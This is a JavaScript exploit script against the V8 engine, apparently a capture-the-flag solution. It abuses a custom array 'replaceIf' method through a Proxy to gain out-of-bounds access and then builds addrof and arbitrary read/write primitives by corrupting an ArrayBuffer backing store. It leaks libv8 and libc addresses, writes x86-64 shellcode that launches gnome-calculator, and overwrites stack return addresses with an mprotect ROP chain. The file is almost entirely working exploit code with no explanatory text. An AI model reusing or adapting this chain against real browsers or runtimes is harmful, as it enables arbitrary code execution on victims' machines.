function jit(x){
	return  1*x;
	//readline();
};

for(let i = 0; i < 1000000; i++){
jit(1);
}

console.log("End JIT");

let conva = new ArrayBuffer(8);
let convi = new Uint32Array(conva);
let convf = new Float64Array(conva);

let toBig = (f) => {
    convf[0] = f;
    let b = BigInt(convi[1]) << 32n;
    b += BigInt(convi[0]);
    return b;
}
// Bigint to float
let fromBig = (b) => {
    convi[0] = Number(b & 0xffffffffn);
    convi[1] = Number(b >> 32n);
    return convf[0];
}

let target_float_array = new Array(10);
target_float_array.fill(1.2);


let target_js_array = new Array(11);
target_js_array.fill({});

var arrayBuf1 = new ArrayBuffer(0xa00);
let viewer = new Uint32Array(arrayBuf1);

var typedArray2 = new ArrayBuffer(0x100);//Just used to make it easier to modify the first typed array
//Otherwise we have to deal with float to int trash (actually seems really annoying)



let float_proxy = new Proxy(target_float_array, {
    get: function(obj, prop) {
        if (prop == 'length')
            return 0xffffffff;
        return obj[prop];
    }
});


let readOutOfBounds = function(i){
    var n;
    float_proxy.replaceIf(i, function(d){
    n=toBig(d);
    return false;
    },
 0);
    return n;
}

let writeOutOfBounds = function(i,value){
    if (typeof(value) == 'bigint'){
        value = fromBig(value);
    }
    float_proxy.replaceIf(i,function(d){
    return true;
    },value);
}


var target_js_array_idx;
var seen=0;
for(let i = 5; i < 100; i++){
	let res = readOutOfBounds(i);
	if(res == 0x0000000b00000000){
		target_js_array_idx = i;
		break;
	}
}

console.log("Addr Of Array Offset: 0x" + target_js_array_idx.toString(16));
for(let i = 0; i < 5; i++){
console.log("");
}

target_js_array[0]={x:1};





//was here
jit();
target_js_array[0]=jit;

let addrof = function(obj){
	target_js_array[0]=obj;
	return readOutOfBounds(target_js_array_idx+5);//5 by trial and error.
}

console.log("JIT [Function]: 0x" + addrof(jit).toString(16));




var typed_array_off;
for(let i = 0; i < 200; i++){
        let res = readOutOfBounds(i);
        if(res == 0x000000a0000000000){
                typed_array_off = i;
                break;
        }
}

console.log(typed_array_off);
console.log("Typed Array: 0x" + addrof(arrayBuf1).toString(16));
//console.log("Target Array: 0x" + addrof(target_float_array).toString(16));
console.log("Backing Store: 0x" + readOutOfBounds(typed_array_off+1).toString(16));
//%OptimizeFunctionOnNextCall(jit);
jit();


//Make one typed array point to the other. Then access things with a Uint32Buffer
//This makes it MUCH easier to deal with changing the backing_store pointer to what we want.
let typed_array_addr1 = addrof(typedArray2)-1n;//ptr tagging
writeOutOfBounds(typed_array_off+1,typed_array_addr1);
console.log("New Backing Store: 0x" + readOutOfBounds(typed_array_off+1).toString(16));
let AbsView = new Uint32Array(arrayBuf1);

//Pretty much the backing_store of arrayBuf1 is the address of typedArray2.
let read = function(addr) {
    AbsView[8] = Number(addr & 0xffffffffn);
    AbsView[9] = Number(addr >> 32n);
    let buff = new Uint32Array(typedArray2);
    let v = BigInt(buff[1]) << 32n;
    v += BigInt(buff[0]);
    return v;
};

let writeQ = function(addr, value){
    AbsView[8] = Number(addr & 0xffffffffn);
    AbsView[9] = Number(addr >> 32n);
    let buf = new Uint32Array(typedArray2);
    buf[0] = Number(value & 0xffffffffn);
    buf[1] = Number(value >> 32n);
};

let writeU8 = function(addr, value){
    AbsView[8] = Number(addr & 0xffffffffn);
    AbsView[9] = Number(addr >> 32n);
    let buf = new Uint8Array(typedArray2);
    buf[0]=value;
};

jitAddr = read(addrof(jit)-1n + 0x30n) -1n + 0x40n;
console.log("JIT CODE: 0x"+ jitAddr.toString(16));


let arb_uint8 = function(addr) {
    AbsView[4*2] = Number(addr & 0xffffffffn);
    AbsView[4*2+1] = Number(addr >> 32n);
    return new Uint8Array(typedArray2);
}



let shellcode = [0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x59, 0x49, 0x81, 0xe9, 0x05, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x01, 0x00, 0x00, 0xbf, 0x6b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb1, 0x61, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x20, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0xb8, 0x51, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x49, 0x8d, 0xb9, 0x62, 0x00, 0x00, 0x00, 0xb8, 0xa1, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb9, 0x64, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x57, 0x48, 0x89, 0xe6, 0x49, 0x8d, 0x91, 0x7e, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x52, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xc3,0xc3,
//0xeb, 0xfe, 
0x2e, 0x2e, 0x00, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00];
console.log("Writting code: 0x"+ jitAddr.toString(16));

array_addr = addrof(Array)-1n;

console.log("Array Address: 0x" + array_addr.toString(16));
array_constructor_jit = read(array_addr+0x30n)-1n;
console.log("Array_Constructor_JIT: 0x"+array_constructor_jit.toString(16));
v8_ptr = read(array_constructor_jit+0x42n);
console.log("v8 ptr: 0x" + v8_ptr.toString(16));
if (typeof document == 'undefined'){
	console.log("v8");
	libv8Base=v8_ptr-0x216abc0n;
	libv8gotstart=libv8Base+0x25cd000n;
	console.log("Clock_get_time in got: 0x"+(libv8gotstart+0x9b000n).toString(16));
	clock_get_time=read(libv8gotstart+0x9b000n);
	var libc_base = clock_get_time-0x115850n;
	var cc_addr = libv8Base+0xcb616fn;
	console.log("Libc base: 0x" + libc_base.toString(16));
}else{
	console.log("Chrome");
}

environ=libc_base+0x3c6f38n;
console.log("Environ: 0x"+environ.toString(16));
stack_ptr = read(environ);
console.log("Stack Pointer: 0x"+stack_ptr.toString(16));


console.log("0xcc : 0x" + cc_addr.toString(16));
rsp_region=stack_ptr-0x1000n;
console.log("RSP at about: 0x"+rsp_region.toString(16));
builtin_js_addr = 0n;

//let sc_array = new Uint8Array(2048);
//for (let i = 0; i < shellcode.length; i++) {
//  sc_array[i] = shellcode[i];
//}

pop_rdi = 0x0000000000021102n+libc_base;
//sc_addr = read(addrof(sc_array)-1n+0x68n);
pop_rsi = 0x00000000000202e8n+libc_base;
pop_rdx = 0x0000000000001b92n+libc_base;
mprotect = 0x0000000000101770n+libc_base;
//sc_addr = 0x100;
sc_addr=0x100n;

sc_addr=environ;//&(~(0xffffn));
base =sc_addr%4096n;
console.log(base);
sc_addr=sc_addr-base;
arb_uint8(sc_addr).set(shellcode);
let rop = [
pop_rdi,
sc_addr,
sc_addr,
pop_rsi,
4096n,
pop_rdx,
0x7n,
mprotect,
sc_addr
];


//Attacking Builtins_JSEntryTrampoline+99 on the stack
for(let offset = 0n; offset < 0x1f00n; offset=offset+8n){
	addr=rsp_region-offset;
	res = read(addr);
	if(res.toString(16).endsWith("ac3")){
		//writeQ(addr,cc_addr);
		console.log((addr).toString(16) + "->0x" + res.toString(16));
		console.log("0x"+read(addr).toString(16));
		builtin_js_addr = addr;
		//break;	
		
	}
	//console.log((addr).toString(16));
}

//%DebugPrint(Array);
//0x7ffff63ff16f -> c3

for(i = 0; i < rop.length; i++){
	write_addr=BigInt(i)*8n;
	write_addr+=builtin_js_addr;
	console.log("writing 0x" + rop[i].toString(16) + " to 0x" + write_addr.toString(16));
	writeQ(write_addr,rop[i]);
}

//jit();

console.log("sc_addr: 0x" + sc_addr.toString(16));
console.log("Did run");
//readline();
//7ffff782fac3
//readline();
